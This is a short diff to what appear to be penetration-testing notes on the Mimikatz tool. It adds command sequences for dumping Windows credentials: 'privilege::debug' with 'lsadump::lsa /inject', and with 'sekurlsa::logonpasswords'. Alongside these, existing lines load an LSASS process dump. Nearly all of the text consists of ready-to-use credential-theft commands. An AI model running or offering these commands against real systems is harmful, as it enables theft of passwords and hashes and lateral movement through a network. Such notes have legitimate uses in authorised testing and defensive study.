@@ -20,3 +20,15 @@ It is always a good idea to type "log" before running any commands in "Mimikatz"
 
     sekurlsa::minidump <process_dump>   loads process dump
     sekurlsa::logonpasswords    Searches for passwords
+
+
+To do a lsa dump
+
+
+    privilege::debug
+    lsadump::lsa /inject
+
+or
+
+    privilege::debug
+    sekurlsa::logonpasswords
